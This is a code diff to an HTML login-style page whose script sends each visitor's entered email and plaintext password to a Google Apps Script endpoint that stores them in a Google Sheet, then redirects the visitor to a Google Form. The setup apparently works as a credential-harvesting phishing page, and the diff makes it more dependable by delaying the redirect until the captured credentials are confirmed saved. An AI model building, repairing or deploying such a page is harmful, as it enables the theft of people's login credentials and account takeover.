@@ -76,7 +76,7 @@
             <!-- Email Field -->
             <label for="email">Email</label>
             <input 
-                type="text" 
+                type="email" 
                 id="email" 
                 name="email" 
                 minlength="10" 
@@ -123,22 +123,33 @@
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            // Save to Google Sheets
-            saveToGoogleSheet(email, password);
-
-            // Redirect to Google Form
-            window.location.href = "https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit";
+            // Save to Google Sheets and redirect after success
+            saveToGoogleSheet(email, password).then(() => {
+                // Redirect to Google Form after data is saved
+                window.location.href = "https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit";
+            }).catch((error) => {
+                // Handle any errors that occurred during the save
+                console.error("Error saving data:", error);
+            });
         }
 
         // Save Data to Google Sheets
         function saveToGoogleSheet(email, password) {
             const scriptURL = "https://script.google.com/macros/s/AKfycbyhnxlc6f--ZbBNNvaqU6pW38s__nXyg8NX0Bt6WUgiXOIFhI07yq_g5jrE2RkcGUuf/exec"; // Replace with your own script URL
-            fetch(scriptURL, {
+            return fetch(scriptURL, {
                 method: "POST",
                 body: new URLSearchParams({ email, password })
             })
-            .then(response => console.log("Success!", response))
-            .catch(error => console.error("Error!", error.message));
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Failed to save data to Google Sheets");
+                }
+                console.log("Data saved successfully!");
+            })
+            .catch(error => {
+                console.error("Error saving to Google Sheets:", error.message);
+                throw error;  // Re-throw the error to be caught in handleSubmit
+            });
         }
     </script>
 </body>
